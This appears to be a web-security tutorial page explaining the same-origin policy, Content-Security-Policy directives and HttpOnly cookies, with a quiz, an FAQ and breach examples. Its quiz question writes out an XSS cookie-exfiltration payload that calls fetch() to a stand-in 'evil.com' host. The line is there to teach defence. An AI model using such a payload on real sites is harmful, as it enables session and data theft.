title: HTTP Security Basics
subtitle: How cookies, same-origin policy, and security headers form the browser's security model

content.text: The browser's most fundamental security control is the Same-Origin Policy (SOP). It prevents JavaScript on one origin from reading responses from a different origin. An 'origin' is the combination of scheme + hostname + port: https://myapp.com:443. Without SOP, a malicious site could read your bank's response to a request made using your session cookie — stealing your balance, account number, and transaction history.

content.code:
Origin: https://myapp.com

SAME origin (allowed):
  https://myapp.com/api/users          ← same scheme, host, port
  https://myapp.com/dashboard          ← just a different path

DIFFERENT origin (blocked by SOP):
  http://myapp.com                     ← different scheme (http vs https)
  https://api.myapp.com                ← different subdomain
  https://myapp.com:8080               ← different port
  https://othersite.com                ← different host

WHAT SOP BLOCKS:
  JavaScript reading the RESPONSE body from a cross-origin fetch()
  JavaScript accessing an iframe's DOM from a different origin
  localStorage and cookies from other origins

WHAT SOP DOES NOT BLOCK (important!):
  Sending requests to other origins (you CAN send, just can't read responses)
  This is why CSRF is still possible even with SOP

content.text: Security headers — your second line of defence

content.filename: Content Security Policy — the most powerful header
content.code:
Content-Security-Policy controls what the browser is allowed to load.
Each directive specifies a resource type and allowed sources.

DIRECTIVES:
  default-src    fallback for unspecified resource types
  script-src     where JavaScript can be loaded from
  style-src      where CSS can be loaded from
  img-src        where images can be loaded from
  connect-src    where fetch/XHR/WebSocket can connect
  font-src       where fonts can be loaded from
  frame-ancestors who can embed this page in an iframe
  report-uri     where CSP violation reports are sent

SOURCE VALUES:
  'self'         same origin as the document
  'none'         block everything
  https:         any HTTPS source
  'unsafe-inline'  allow inline scripts/styles (weakens XSS protection)
  'nonce-{value}' allow a specific inline script with a matching nonce
  https://cdn.example.com  specific trusted domain

EXAMPLE (tight policy for a React SPA):
  Content-Security-Policy:
    default-src 'self';
    script-src 'self';
    style-src 'self' https://fonts.googleapis.com;
    font-src 'self' https://fonts.gstatic.com;
    img-src 'self' data: https:;
    connect-src 'self' https://api.myapp.com;
    frame-ancestors 'none'

questions.question: An attacker injects JavaScript into your page that runs: fetch('https://evil.com?data=' + document.cookie). The session cookie has HttpOnly: true. What happens?
options: The cookie is sent to evil.com — HttpOnly doesn't protect against this
The fetch is blocked — HTTPS is required for cross-origin requests
document.cookie returns an empty string — HttpOnly cookies are invisible to JavaScript
The browser prompts the user before sending the cookie
questions.explanation: HttpOnly cookies are completely invisible to JavaScript — document.cookie does not include them, and they cannot be accessed by any JavaScript API. The XSS attack can still run, but it cannot steal the session cookie. The attacker gets an empty string. This is exactly why HttpOnly is critical for session tokens: even if XSS exists, the attacker can't steal the session. Note: the attacker could still perform other damage (like submitting forms or reading page content), but they can't take over the session in a different browser.

faq.q: Does my frontend app (React SPA) need security headers?
faq.a: Yes — headers are set by the server serving your index.html and static assets (Nginx, Vercel, Netlify, CloudFront). Even if your React app has no backend, the file server can and should set security headers. Vercel and Netlify let you configure them in vercel.json and netlify.toml respectively. Without them, your app is vulnerable to clickjacking and your CSP is non-existent.

examples: Google sets one of the most restrictive CSPs in production. Their search page uses nonces for each inline script — a unique random value per request that the CSP whitelist includes. This means that even if an attacker injects a script tag, it has no valid nonce and the browser refuses to run it

The British Airways breach (2018, 500,000 customers, £20M GDPR fine) was caused by a script injected into their payment page that sent card details to the attacker's server. A Content-Security-Policy header restricting connect-src to British Airways' own domains would have blocked the data exfiltration
